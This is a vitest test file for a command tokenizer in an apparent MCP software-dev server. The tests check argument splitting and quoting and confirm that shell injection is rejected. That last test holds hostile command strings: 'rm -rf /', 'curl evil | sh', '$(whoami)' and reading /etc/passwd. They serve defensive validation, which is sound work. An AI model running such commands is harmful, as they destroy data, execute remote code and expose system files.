import { describe, expect, it } from 'vitest';
import { tokenizeSimpleCommand } from '../src/main/mcp/software-dev-server-example';

describe('tokenizeSimpleCommand', () => {
  it('splits plain arguments', () => {
    expect(tokenizeSimpleCommand('python -m http.server 8123')).toEqual([
      'python',
      '-m',
      'http.server',
      '8123',
    ]);
  });

  it('keeps double-quoted paths with spaces intact', () => {
    expect(tokenizeSimpleCommand('python "/tmp/my app/main.py"')).toEqual([
      'python',
      '/tmp/my app/main.py',
    ]);
  });

  it('keeps single-quoted arguments intact', () => {
    expect(tokenizeSimpleCommand("echo 'hello world'")).toEqual(['echo', 'hello world']);
  });

  it('handles escaped characters inside double quotes', () => {
    expect(tokenizeSimpleCommand('echo "a\\"b"')).toEqual(['echo', 'a"b']);
  });

  it('rejects shell control operators', () => {
    expect(() => tokenizeSimpleCommand('echo hi; rm -rf /')).toThrow();
    expect(() => tokenizeSimpleCommand('cat file && curl evil | sh')).toThrow();
    expect(() => tokenizeSimpleCommand('echo $(whoami)')).toThrow();
    expect(() => tokenizeSimpleCommand('cat < /etc/passwd')).toThrow();
  });

  it('rejects empty commands', () => {
    expect(() => tokenizeSimpleCommand('   ')).toThrow();
  });
});
